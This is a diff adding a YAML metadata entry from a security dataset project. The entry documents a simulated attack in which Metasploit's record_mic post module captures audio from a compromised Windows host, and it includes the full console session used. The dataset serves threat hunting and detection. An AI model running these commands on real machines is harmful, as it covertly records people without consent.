@@ -1,0 +1,74 @@
+title: MSF Record Mic
+id: SDWIN-200609225055
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/06/09
+modification_date: 2020/06/09
+platform:
+- Windows
+type: atomic
+tags:
+  - Microphone Access
+description: This dataset represents adversaries accessing the microphone of an endpoint.
+attack_mappings:
+  - technique: T1123
+    sub-technique: 
+    tactics:
+      - TA0009
+notebooks:
+  - project: Threat Hunter Playbook
+    name: Processes Accessing the Microphone Device
+    link: https://threathunterplaybook.com/notebooks/windows/09_collection/WIN-200609225055.html 
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/collection/host/msf_record_mic.zip
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: C2
+      name: Metasploit
+      module: post
+      script: https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb
+  permissions_required:
+    - User
+  adversary_view: |-
+    msf5 exploit(multi/handler) > use post/multi/manage/record_mic
+    msf5 post(multi/manage/record_mic) > set SESSION 2
+    SESSION => 2
+    msf5 post(multi/manage/record_mic) > info
+
+          Name: Multi Manage Record Microphone
+        Module: post/multi/manage/record_mic
+      Platform: Linux, OSX, Windows
+          Arch: 
+          Rank: Normal
+
+    Provided by:
+      sinn3r <sinn3r@metasploit.com>
+
+    Compatible session types:
+      Meterpreter
+
+    Basic options:
+      Name      Current Setting  Required  Description
+      ----      ---------------  --------  -----------
+      DURATION  5                no        Number of seconds to record
+      SESSION   2                yes       The session to run this module on.
+
+    Description:
+      This module will enable and record your target's microphone. For 
+      non-Windows targets, please use Java meterpreter to be able to use 
+      this feature.
+
+    msf5 post(multi/manage/record_mic) > run
+
+    [*] 172.18.39.6 - 20%...
+    [*] 172.18.39.6 - 40%...
+    [*] 172.18.39.6 - 60%...
+    [*] 172.18.39.6 - 80%...
+    [*] 172.18.39.6 - 100%...
+    [*] 172.18.39.6 - Audio size: (55169 bytes)
+    [+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav
+    [*] Post module execution completed
+    msf5 post(multi/manage/record_mic) >
+references:
